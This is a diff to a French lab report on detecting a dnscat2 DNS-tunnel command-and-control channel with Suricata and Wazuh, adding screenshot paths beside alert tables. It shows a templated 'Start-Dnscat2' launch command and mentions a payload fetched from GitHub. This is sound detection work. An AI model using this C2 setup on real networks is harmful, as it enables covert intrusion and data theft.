@@ -44,6 +44,8 @@ Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
 
 ## 3. Architecture mise en place pour le test
 
+"C:\Users\grimj\Pictures\Screenshots\Capture d'écran 2026-10-30 153710.png"
+
 | Machine | Rôle | IP | Outils installés |
 |---|---|---|---|
 | OPNsense | Firewall / IDS | 192.168.56.1 | Suricata (règles ET Open + règle custom) |
@@ -52,6 +54,7 @@ Start-Dnscat2 -Domain #{domain} -DNSServer #{server_ip}
 | Rocky Linux | Wazuh Manager | 192.168.56.10 | Wazuh Manager, Dashboard |
 | Arch Linux | Attaquant (écouteur C2) | 192.168.56.54 | dnscat2, Wireshark, tcpdump |
 | Ubuntu | Victime secondaire | 192.168.56.59 | Wazuh Agent (optionnel, non utilisé dans ce test) |
+
 
 ### 3.1 Choix de conception clé — redirection du trafic DNS vers le pare-feu
 
@@ -186,7 +189,11 @@ scp root@192.168.56.54:/tmp/dnscat2_final.pcap C:\Users\grimj\Desktop\
 | 2026-10-25T17:56:18.611877+0000 | 2028880 | autorisé | 192.168.56.61 | 54072 | 192.168.56.1 | 53 | ET MALWARE Anchor_DNS Trickbot DNS Commande CnC - Envoi de données |
 | 2026-10-25T17:56:18.445339+0000 | 2028880 | autorisé | 192.168.56.61 | 54071 | 192.168.56.1 | 53 | ET MALWARE Anchor_DNS Trickbot DNS Commande CnC - Envoi de données |
 
+"C:\Users\grimj\Pictures\Screenshots\Capture d'écran 2026-10-25 175917.png"
+
 **Détail d'une alerte (fiche complète) :**
+
+"C:\Users\grimj\Pictures\Screenshots\Capture d'écran 2026-10-25 180311.png"
 
 ```
 Horodatage        : 2026-10-25T17:56:18.611877+0000
@@ -227,6 +234,8 @@ Action configurée  : Activé / Alerte
 | 17:48:52.150 | 92052 | Invite de commande lancée par un processus anormal | 4 |
 | 17:48:52.165 | 92052 | Invite de commande lancée par un processus anormal | 4 |
 
+"C:\Users\grimj\Pictures\Screenshots\Capture d'écran 2026-10-25 180242.png"
+
 **Lecture technique :**
 
 - La règle **100200** (niveau 5), identique à celle utilisée dans les tests précédents de la série, capture bien la requête DNS vers `raw.githubusercontent.com` — le téléchargement du payload (T1105). La requête `wdcp.microsoft.com` quelques secondes avant est un artefact normal (Windows Defender Cloud Protection) non lié à l'attaque, utile pour rappeler qu'un analyste SOC doit distinguer bruit et signal.
@@ -236,6 +245,8 @@ Action configurée  : Activé / Alerte
 **Constat important :** sur ce test, **Wazuh seul n'a pas généré d'alerte de niveau critique spécifique au tunnel dnscat2 lui-même** (contrairement aux tests #1–#3 où la règle 100204 montait à Level 12). Les événements hôtes restent de niveau 3 à 5 — suffisants pour un triage attentif, mais c'est bien **Suricata côté réseau qui a fourni la confirmation critique et sans ambiguïté du canal C2** (règle Trickbot, SID 2028880). Ce constat illustre un principe central du SOC : **la défense en profondeur et la corrélation multi-source sont indispensables**, un seul capteur pouvant manquer ou sous-évaluer une menace que l'autre détecte clairement.
 
 ### 6.3 Vérification du Wazuh Manager — agent `server`
+
+  "C:\Users\grimj\Pictures\Screenshots\Capture d'écran 2026-10-25 175814.png"
 
 Côté SERVER01-CORE, vérification du bon fonctionnement de l'agent Wazuh après les opérations de nettoyage des zones DNS `dnscat` :
 
